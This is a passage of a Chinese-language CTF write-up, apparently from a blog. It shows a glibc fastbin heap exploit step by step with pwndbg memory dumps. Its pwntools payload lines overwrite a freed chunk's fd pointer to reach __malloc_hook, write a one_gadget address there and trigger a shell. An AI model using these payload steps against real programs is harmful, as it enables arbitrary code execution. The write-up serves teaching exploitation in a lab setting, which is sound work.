class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span> #index4(由unsortedbin分裂)</span><br><span class="line">.....（省略内容均为空）</span><br><span class="line"><span class="number">0x5555557570f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index5(由unsortedbin分裂)</span><br><span class="line"><span class="number">0x555555757100</span>:	<span class="number">0x00007ffff7dd1b78</span>	<span class="number">0x00007ffff7dd1b78</span></span><br><span class="line"><span class="number">0x555555757110</span>:	<span class="number">0x0000000000000020</span>	<span class="number">0x0000000000000090</span> #index6（原index5）</span><br><span class="line">.....（省略内容均为空）</span><br><span class="line"><span class="number">0x5555557571a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020e61</span> #top_chunk</span><br><span class="line">.....（省略内容均为空）</span><br><span class="line"><span class="number">0x5555557571d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>从上面的堆情况可以看到，由于是 malloc(0x60)，而原 unsortedbin 中的 chunk_size 过大，因此 unsortedbin 中的 chunk 会利用并分裂成两个堆块，其中 index5 还是存放在 unsortedbin 中的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all [corrupted]</span><br><span class="line">FD: <span class="number">0x5555557570f0</span> —▸ <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x5555557570f0</span></span><br><span class="line">BK: <span class="number">0x5555557570f0</span> ◂— <span class="number">0x90</span></span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">执行payload前：</span><br><span class="line">unsortedbin</span><br><span class="line">all [corrupted]</span><br><span class="line">FD: <span class="number">0x555555757080</span> ◂— <span class="number">0x0</span></span><br><span class="line">BK: <span class="number">0x555555757080</span> —▸ <span class="number">0x7ffff7dd1b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x555555757080</span></span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>此时结构体的情况：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x5fcead98730</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000000000000010</span></span><br><span class="line">    			#index0</span><br><span class="line"><span class="number">0x5fcead98740</span>:	<span class="number">0x0000555555757010</span>	<span class="number">0x0000000000000001</span></span><br><span class="line">    								#index1</span><br><span class="line"><span class="number">0x5fcead98750</span>:	<span class="number">0x0000000000000010</span>	<span class="number">0x0000555555757050</span></span><br><span class="line"><span class="number">0x5fcead98760</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000000000000010</span></span><br><span class="line">     			#index2</span><br><span class="line"><span class="number">0x5fcead98770</span>:	<span class="number">0x0000555555757090</span>	<span class="number">0x0000000000000001</span></span><br><span class="line">    							    #index3</span><br><span class="line"><span class="number">0x5fcead98780</span>:	<span class="number">0x0000000000000010</span>	<span class="number">0x0000555555757070</span></span><br><span class="line"><span class="number">0x5fcead98790</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000000000000060</span></span><br><span class="line">    			#index4（此处发生了改变）#（此处发生了改变）</span><br><span class="line"><span class="number">0x5fcead987a0</span>:	<span class="number">0x0000555555757090</span>	<span class="number">0x0000000000000001</span></span><br><span class="line">    			#（此处发生了改变）	   #index6（原index5）</span><br><span class="line"><span class="number">0x5fcead987b0</span>:	<span class="number">0x0000000000000080</span>	<span class="number">0x0000555555757120</span></span><br></pre></td></tr></table></figure>

<h3 id="2-2、free-index4"><a href="#2-2、free-index4" class="headerlink" title="2-2、free(index4)"></a>2-2、free(index4)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#index2_content指针还是指向index4_chunk_data</span><br><span class="line">#为了修改之后index4的fd指针，因此我们可以先释放<span class="function">index4</span></span><br><span class="line"><span class="function"><span class="title">free</span><span class="params">(<span class="number">4</span>)</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x555555757080</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin （这里显示不准确）</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757000</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757020</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757040</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757060</span></span><br><span class="line">Size: <span class="number">0x71</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5555557570d0</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: <span class="number">0x5555557570f0</span></span><br><span class="line">Size: <span class="number">0x90</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757180</span></span><br><span class="line">Size: <span class="number">0x20e61</span></span><br><span class="line">pwndbg&gt; x/<span class="number">60</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index0</span><br><span class="line"><span class="number">0x555555757010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index1</span><br><span class="line"><span class="number">0x555555757030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index2</span><br><span class="line"><span class="number">0x555555757050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index3</span><br><span class="line"><span class="number">0x555555757070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span> #index4（fastbin）</span><br><span class="line">.....（省略内容均为空）</span><br><span class="line"><span class="number">0x5555557570f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index5（unsortedbin）</span><br><span class="line"><span class="number">0x555555757100</span>:	<span class="number">0x00007ffff7dd1b78</span>	<span class="number">0x00007ffff7dd1b78</span></span><br><span class="line"><span class="number">0x555555757110</span>:	<span class="number">0x0000000000000020</span>	<span class="number">0x0000000000000090</span> #index6</span><br><span class="line">.....（省略内容均为空）</span><br><span class="line"><span class="number">0x5555557571a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020e61</span> #top_chunk</span><br><span class="line">.....（省略内容均为空）</span><br><span class="line"><span class="number">0x5555557571d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x5fcead98730</span>:  <span class="number">0x0000000000000001</span>  <span class="number">0x0000000000000010</span></span><br><span class="line">                #index0</span><br><span class="line"><span class="number">0x5fcead98740</span>:  <span class="number">0x0000555555757010</span>  <span class="number">0x0000000000000001</span></span><br><span class="line">                                    #index1</span><br><span class="line"><span class="number">0x5fcead98750</span>:  <span class="number">0x0000000000000010</span>  <span class="number">0x0000555555757050</span></span><br><span class="line"><span class="number">0x5fcead98760</span>:  <span class="number">0x0000000000000001</span>  <span class="number">0x0000000000000010</span></span><br><span class="line">                #index2</span><br><span class="line"><span class="number">0x5fcead98770</span>:  <span class="number">0x0000555555757090</span>  <span class="number">0x0000000000000001</span></span><br><span class="line">                                    #index3</span><br><span class="line"><span class="number">0x5fcead98780</span>:  <span class="number">0x0000000000000010</span>  <span class="number">0x0000555555757070</span></span><br><span class="line"><span class="number">0x5fcead98790</span>:  <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line">                #index4（此处发生了改变）#（此处发生了改变）</span><br><span class="line"><span class="number">0x5fcead987a0</span>:  <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000001</span></span><br><span class="line">                #（此处发生了改变）     #index6（原index5）</span><br><span class="line"><span class="number">0x5fcead987b0</span>:  <span class="number">0x0000000000000080</span>  <span class="number">0x0000555555757120</span></span><br></pre></td></tr></table></figure>

<h3 id="2-3、修改-index4-的-fd-指针"><a href="#2-3、修改-index4-的-fd-指针" class="headerlink" title="2-3、修改 index4 的 fd 指针"></a>2-3、修改 index4 的 fd 指针</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#然后修改fd指针,通过index2往index4上写为malloc_hook,这样再次申请的时候会分配到这个地址</span><br><span class="line">#但问题是我们去申请的时候会检查size是不是 fakefd + <span class="number">8</span> == 当前fastbin的大小</span><br><span class="line">#这个地址是main_arena<span class="number">-0x40</span>+<span class="number">0xd</span>,具体看后面图片解释</span><br><span class="line">payload = p64(libc_base+<span class="number">0x3c4aed</span>)</span><br><span class="line">fill(<span class="number">2</span>, payload)</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">60</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index0</span><br><span class="line"><span class="number">0x555555757010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index1</span><br><span class="line"><span class="number">0x555555757030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index2</span><br><span class="line"><span class="number">0x555555757050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index3</span><br><span class="line"><span class="number">0x555555757070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span> #index4（fastbin）</span><br><span class="line"><span class="number">0x555555757090</span>:	<span class="number">0x00007ffff7dd1aed</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">    			#更改index4的fd指针</span><br><span class="line">.....（省略内容均为空）</span><br><span class="line"><span class="number">0x5555557570f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> #index5（unsortedbin）</span><br><span class="line"><span class="number">0x555555757100</span>:	<span class="number">0x00007ffff7dd1b78</span>	<span class="number">0x00007ffff7dd1b78</span></span><br><span class="line"><span class="number">0x555555757110</span>:	<span class="number">0x0000000000000020</span>	<span class="number">0x0000000000000090</span> #index6</span><br><span class="line">.....（省略内容均为空）</span><br><span class="line"><span class="number">0x5555557571a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020e61</span> #top_chunk</span><br><span class="line">.....（省略内容均为空）</span><br><span class="line"><span class="number">0x5555557571d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">16</span>gx <span class="number">0x00007ffff7dd1aed</span></span><br><span class="line"><span class="number">0x7ffff7dd1aed</span> &lt;_IO_wide_data_0+<span class="number">301</span>&gt;:	<span class="number">0xfff7dd0260000000</span>	<span class="number">0x000000000000007f</span></span><br><span class="line"><span class="number">0x7ffff7dd1afd</span>:	<span class="number">0xfff7a92ea0000000</span>	<span class="number">0xfff7a92a7000007f</span></span><br><span class="line"><span class="number">0x7ffff7dd1b0d</span> &lt;__realloc_hook+<span class="number">5</span>&gt;:	<span class="number">0x000000000000007f</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b1d</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b2d</span> &lt;main_arena+<span class="number">13</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b3d</span> &lt;main_arena+<span class="number">29</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b4d</span> &lt;main_arena+<span class="number">45</span>&gt;:	<span class="number">0x5555757080000000</span>	<span class="number">0x0000000000000055</span></span><br><span class="line"><span class="number">0x7ffff7dd1b5d</span> &lt;main_arena+<span class="number">61</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>此时程序的结构体未发生改变</p>
</blockquote>
<h3 id="2-4、控制-malloc-hook"><a href="#2-4、控制-malloc-hook" class="headerlink" title="2-4、控制__malloc_hook"></a>2-4、控制__malloc_hook</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#这时候再去申请两个,第一个是给前面<span class="built_in">free</span>的index4,第二个就会分配到malloc_hook处</span><br><span class="line">alloc(<span class="number">0x60</span>)#<span class="function">index4</span></span><br><span class="line"><span class="function"><span class="title">alloc</span><span class="params">(<span class="number">0x60</span>)</span>#index7</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">16</span>gx <span class="number">0x00007ffff7dd1aed</span></span><br><span class="line"><span class="number">0x7ffff7dd1aed</span> &lt;_IO_wide_data_0+<span class="number">301</span>&gt;:	<span class="number">0xfff7dd0260000000</span>	<span class="number">0x000000000000007f</span></span><br><span class="line"><span class="number">0x7ffff7dd1afd</span>:	<span class="number">0xfff7a92ea0000000</span>	<span class="number">0xfff7a92a7000007f</span></span><br><span class="line"><span class="number">0x7ffff7dd1b0d</span> &lt;__realloc_hook+<span class="number">5</span>&gt;:	<span class="number">0x000000000000007f</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b1d</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b2d</span> &lt;main_arena+<span class="number">13</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b3d</span> &lt;main_arena+<span class="number">29</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b4d</span> &lt;main_arena+<span class="number">45</span>&gt;:	<span class="number">0x2ea0000000000000</span>	<span class="number">0x0000000000fff7a9</span></span><br><span class="line"><span class="number">0x7ffff7dd1b5d</span> &lt;main_arena+<span class="number">61</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x5fcead98730</span>:  <span class="number">0x0000000000000001</span>  <span class="number">0x0000000000000010</span></span><br><span class="line">                #index0</span><br><span class="line"><span class="number">0x5fcead98740</span>:  <span class="number">0x0000555555757010</span>  <span class="number">0x0000000000000001</span></span><br><span class="line">                                    #index1</span><br><span class="line"><span class="number">0x5fcead98750</span>:  <span class="number">0x0000000000000010</span>  <span class="number">0x0000555555757050</span></span><br><span class="line"><span class="number">0x5fcead98760</span>:  <span class="number">0x0000000000000001</span>  <span class="number">0x0000000000000010</span></span><br><span class="line">                #index2</span><br><span class="line"><span class="number">0x5fcead98770</span>:  <span class="number">0x0000555555757090</span>  <span class="number">0x0000000000000001</span></span><br><span class="line">                                    #index3</span><br><span class="line"><span class="number">0x5fcead98780</span>:  <span class="number">0x0000000000000010</span>  <span class="number">0x0000555555757070</span></span><br><span class="line"><span class="number">0x5fcead98790</span>:  <span class="number">0x0000000000000001</span>  <span class="number">0x0000000000000060</span></span><br><span class="line">                #index4（此处发生了改变）#（此处发生了改变）</span><br><span class="line"><span class="number">0x5fcead987a0</span>:  <span class="number">0x0000555555757090</span>  <span class="number">0x0000000000000001</span></span><br><span class="line">                #（此处发生了改变）     #index6（原index5）</span><br><span class="line"><span class="number">0x5fcead987b0</span>:  <span class="number">0x0000000000000080</span>  <span class="number">0x0000555555757120</span></span><br><span class="line"><span class="number">0x5fcead987c0</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000000000000060</span></span><br><span class="line">    			#index7</span><br><span class="line"><span class="number">0x5fcead987d0</span>:	<span class="number">0x00007ffff7dd1afd</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>这里用到了 fastbin_attack 中的 Arbitrary Alloc，具体细节请参考上一节。</strong></p>
</blockquote>
<h3 id="2-5、写入-one-gadget-并-getshell"><a href="#2-5、写入-one-gadget-并-getshell" class="headerlink" title="2-5、写入 one_gadget 并 getshell"></a>2-5、写入 one_gadget 并 getshell</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#然后往malloc_hook上写one_gadget的地址</span><br><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(libc_base+<span class="number">0x4527a</span>)</span><br><span class="line">fill(<span class="number">6</span>, payload)</span><br><span class="line">gdb.attach(p)</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">执行payload前：</span><br><span class="line">pwndbg&gt; x/<span class="number">16</span>gx <span class="number">0x00007ffff7dd1aed</span></span><br><span class="line"><span class="number">0x7ffff7dd1aed</span> &lt;_IO_wide_data_0+<span class="number">301</span>&gt;:	<span class="number">0xfff7dd0260000000</span>	<span class="number">0x000000000000007f</span></span><br><span class="line"><span class="number">0x7ffff7dd1afd</span>:	<span class="number">0xfff7a92ea0000000</span>	<span class="number">0xfff7a92a7000007f</span></span><br><span class="line">    			#chunk_data</span><br><span class="line"><span class="number">0x7ffff7dd1b0d</span> &lt;__realloc_hook+<span class="number">5</span>&gt;:	<span class="number">0x000000000000007f</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b1d</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b2d</span> &lt;main_arena+<span class="number">13</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b3d</span> &lt;main_arena+<span class="number">29</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b4d</span> &lt;main_arena+<span class="number">45</span>&gt;:	<span class="number">0x2ea0000000000000</span>	<span class="number">0x0000000000fff7a9</span></span><br><span class="line"><span class="number">0x7ffff7dd1b5d</span> &lt;main_arena+<span class="number">61</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">执行payload后：</span><br><span class="line">pwndbg&gt; x/<span class="number">16</span>gx <span class="number">0x00007ffff7dd1aed</span></span><br><span class="line"><span class="number">0x7ffff7dd1aed</span> &lt;_IO_wide_data_0+<span class="number">301</span>&gt;:	<span class="number">0xfff7dd0260000000</span>	<span class="number">0x000000000000007f</span></span><br><span class="line"><span class="number">0x7ffff7dd1afd</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b0d</span> &lt;__realloc_hook+<span class="number">5</span>&gt;:	<span class="number">0xfff7a5227a000000</span>	<span class="number">0x000000000000007f</span></span><br><span class="line">    								#one_gadget</span><br><span class="line"><span class="number">0x7ffff7dd1b1d</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b2d</span> &lt;main_arena+<span class="number">13</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b3d</span> &lt;main_arena+<span class="number">29</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1b4d</span> &lt;main_arena+<span class="number">45</span>&gt;:	<span class="number">0x2ea0000000000000</span>	<span class="number">0x0000000000fff7a9</span></span><br><span class="line"><span class="number">0x7ffff7dd1b5d</span> &lt;main_arena+<span class="number">61</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>我本机上的 one_gadget 如下图所示，可能需要尝试并更换多个 one_gadget 才能 getshell：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1604720295529-f9788e54-ee53-4744-bbcc-fbf87b37eb44.png#align=left&display=inline&height=658&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2020-11-07%2011.38.10.png&originHeight=658&originWidth=2250&size=622210&status=done&style=none&width=2250" alt="截屏2020-11-07 11.38.10.png"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#再申请一下触发<span class="function">one_gadget</span></span><br><span class="line"><span class="function"><span class="title">alloc</span><span class="params">(<span class="number">255</span>)</span></span></span><br><span class="line"><span class="function">p.<span class="title">interactive</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>

